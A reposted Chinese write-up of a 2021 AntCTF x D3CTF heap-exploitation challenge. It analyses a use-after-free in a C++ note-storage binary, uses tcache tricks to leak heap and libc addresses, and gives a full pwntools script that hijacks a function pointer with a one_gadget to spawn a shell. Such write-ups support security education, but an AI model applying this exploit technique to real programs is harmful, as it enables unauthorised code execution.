> 原文链接: https://www.anquanke.com//post/id/234213 


# 2021 AntCTF x D3CTF 狡兔三窟题解


                                阅读量   
                                **128913**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01bc5aa926515c064d.jpg)](https://p1.ssl.qhimg.com/t01bc5aa926515c064d.jpg)



这道题比赛的时候，只有三支队伍做出来，其实只要把程序逻辑分析透彻，这道题并不是很难。所以现在放一下这道题题解。



## 程序逻辑

```
case 1:
        NoteStorageImpl::editHouse(chunk11);
        break;
      case 2:
        NoteStorageImpl::saveHouse(chunk11);
        break;
      case 3:
        NoteStorageImpl::backup(chunk11);
        break;
      case 4:
        NoteStorageImpl::encourage(chunk11);
        break;
      case 5:
        NoteStorageImpl::delHouse(chunk11);
        break;
      case 6:
        NoteStorageImpl::show(chunk11);
        break;
```

提供了 6种功能，Edit可以输入数据到堆块，存储机制类似 vector，输入超出当前堆块时，会将申请更大的堆块，并将数据拷贝到新堆块，释放旧堆块；此外 Edit里有在释放第一个存储堆块后，还可以继续输入第二个存储堆块，也有一次 clear机会，可以从头重新输入数据。Save功能，会**申请一个与当前存储数据的堆块数据内容大小的堆块**，并将数据拷贝到新堆块，更新管理结构体。backup会将第一个存储数据的堆块的地址放入一个 0x20的堆块 偏移 0x8的位置 存储。delete功能，当执行了backup后，可以删掉第一个存储数据堆块。show只有当执行了delete功能后，才会输出第一个存储数据堆块的起始 8字节数据 指向的地址信息。

这里，还有一个 encourage功能如下，可以看到有一个很明显的后门，会调用 back_up堆块偏移 0x8数据 指向的 地址 的值。这里也就是 会调用 第一个存储数据堆块 起始 8字节数据指向的地址。

```
__int64 __fastcall NoteDBImpl::getEncourage(NoteDBImpl *back_chunk)
`{`
  __int64 buf_chunk; // rax

  buf_chunk = **((unsigned int **)back_chunk + 1);
  if ( (_DWORD)buf_chunk )
    buf_chunk = (***((__int64 (__fastcall ****)(_QWORD))back_chunk + 1))(*((_QWORD *)back_chunk + 1));
  return buf_chunk;
`}`
```

然后，堆块布局如下所示。init_chunk会存储三个堆块地址，依次是 第一个存储数据结构体地址，第二个存储数据结构体地址，第三个是 bakc_up_chunk 结构体地址。 而存储数据结构体会依次存储 首地址存储 一个数据地址，后面是依次是存储数据会使用的 begin_ptr、ptr和 end_ptr指针。而 back_up_chunk在 0x8时会存储 第一个存储数据结构体地址。

```
init_chunk:
pwndbg&gt; x/20xg 0x55555576de60
0x55555576de60:    0x0000000000000000    0x0000000000000021
0x55555576de70:    0x000055555576de90    0x000055555576e220    // chunk1, chunk2
chunk1:    
0x55555576de80:    0x000055555576e200    0x0000000000000351    //back_up_chunk
0x55555576de90:    0x000055555575ac78    0x0000000000000000    // addr
0x55555576dea0:    0x000055555576e200    0x000055555576e200    // begin_ptr  ptr
0x55555576deb0:    0x000055555576e205    0x0000000000000000    // end_ptr 
chunk2:
pwndbg&gt; x/20xg 0x55555576e210
0x55555576e210:    0x0000000000000000    0x0000000000000351
0x55555576e220:    0x000055555575ac78    0x0000000000000000    // addr  
0x55555576e230:    0x000055555576e590    0x000055555576e590    // begin_ptr ptr
0x55555576e240:    0x000055555576e595    0x0000000000000000    // end_ptr
back_up:
pwndbg&gt; x/20xg 0x55555576e200
0x55555576e1f0:    0x0000000000000000    0x0000000000000021
0x55555576e200:    0x0000000000000000    0x000055555576de90    // chunk1_addr
```



## 程序漏洞

程序漏洞总体上是一个 uaf漏洞。从上面功能可知，需要先 执行 back_up后，才能执行 delete和 show功能。而 back_up会存储第一个 存储数据结构体地址。当我们 delete了第一个 存储数据结构体(0x350)后，back_up_chunk中并不会将 存储的地址 赋值为 0。也就导致我们可以 通过 show函数 泄露被释放的 第一个存储数据结构体堆块(0x350) 数据。

```
int __fastcall NoteDBImpl::gift(NoteDBImpl *back_up_chunk)
`{`
  int result; // eax

  result = *(unsigned __int8 *)back_up_chunk;
  if ( (_BYTE)result )
    result = puts(*((const char **)back_up_chunk + 1));
  return result;
`}`
```

而这里需要注意，如果直接释放 0x350堆块，那么该堆块的 前8字节 也即 next指针会被赋值为0，那么输出时就无输出内容。所以这里，我们需要想办法 在 0x350 tcache链中，先释放一个 0x350堆块，这样 当 delete时，第一个存储数据结构体 next处会存储堆地址。那么我们如何在 delete之前先释放 一个 0x350堆块。这里需要用到 vector机制。前文讲到 vector会自动根据输入内容 申请释放堆块。但是这里，如果我们直接 输入 0x350大小的数据，其会申请 0x500大小的堆块，而不是 0x350。是因为 vector**每次增大堆块时，会申请比之前堆块大一倍的堆块**。这里我们的旧堆块 是 0x290，其一倍也就是 0x500。所以，我们首先需要将 vector原有堆块大小改为 0x1a0，然后扩大堆块时即会申请 0x350。而这里将原有堆块大小改为 0x1a0的方法是 通过 save功能，其会申请一个原有堆块数据大小的新堆块，并更新到 存储管理结构体。这样原有堆块即被我们改为了 0x1a0大小，再增大数据时，就改为了 0x350数据块。最后 delete时，就会释放两个 0x350堆块到 tcache中。这样我们就能成功 泄露 堆块地址。

然后，我们还要泄露 libc地址。这里首先需要注意到 第一个存储数据堆块结构体偏移 0x1b8的地方存储了 malloc的地址。那么这里只需要将这个 malloc地址输出，就能得到 libc地址了。

```
void __fastcall NoteImpl::NoteImpl(NoteImpl *this)
`{`
  Note::Note(this);
  *(_QWORD *)this = &amp;off_206C78;
  *((_BYTE *)this + 8) = 0;
  std::vector&lt;char&gt;::vector((char *)this + 16);
  std::vector&lt;char&gt;::vector((char *)this + 416);
  *((_QWORD *)this + 55) = &amp;malloc;
  std::vector&lt;char&gt;::reserve((char *)this + 416, 5LL);
  std::vector&lt;char&gt;::reserve((char *)this + 16, 5LL);
`}`
```

由于之前已经将 该堆块释放到 0x350的 tcache中，所以，这里我们再次 利用上面的方法 用第二个存储数据管理结构体 把该堆块申请出来，并填充 0x1b8的数据，再利用 show得到 libc地址。

最后，我们只需要利用 clear，从头将 存储结构体 块首指向 偏移 0x8的地址，并在 0x8的地址处放上 gadget地址，即可实现 getshel。



## EXP

```
from pwn import *

binary_name = './easycpp'
debug = 1
if debug == 1:
    #p = process([filename], env=`{`"LD_PRELOAD":"./libc-2.27.so"`}`)
    p = process(binary_name)
    #libc = ELF('./libc-2.27.so')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    elf = ELF(binary_name)
else:
    p = remote('106.14.216.214', 27807)
    libc = ELF('./libc-2.27.so')

gadgets = [0x4f3d5, 0x4f432, 0x10a41c]
def Edit(ch, payload):
    p.sendlineafter('&gt;&gt; ', str(1))
    p.sendlineafter('clear it?(y/N)', ch)
    p.sendlineafter('q to quit):\n', payload)

def Save():
    p.sendlineafter('&gt;&gt; ', str(2))

def Back_up():
    p.sendlineafter('&gt;&gt; ', str(3))

def Enc():
    p.sendlineafter('&gt;&gt; ', str(4))

def Delete():
    p.sendlineafter('&gt;&gt; ', str(5))

def Show():
    p.sendlineafter('&gt;&gt; ', str(6))


payload = 'a'*0x1a0+"q"
Edit('n', payload)
gdb.attach(p, 'bp $rebase(0x141e)')
Back_up()
Save()

payload = 'a'*0x1a0+"q"
Edit('n', payload)

Delete()

Show()
heap_addr = u64(p.recv(6).ljust(8, b'\x00'))
print('heap_addr:',hex(heap_addr))

payload = 'a'*0x1a0+'q'
Edit('n', payload)

Save()
print(' hajack chunk2')
payload = "a"*(0x1b8-0x1a0)+"q"
Edit('n', payload)
Show()
p.recvuntil('a'*0x1b8)
libc.address = u64(p.recv(6).ljust(8, b'\x00'))-libc.sym['malloc']

gadget = gadgets[2]+libc.address
print(hex(gadget))
payload = p64(heap_addr-0x2230+8)+p64(gadget)+"aaaq"
Edit('y', payload)

Enc()

p.interactive()
```
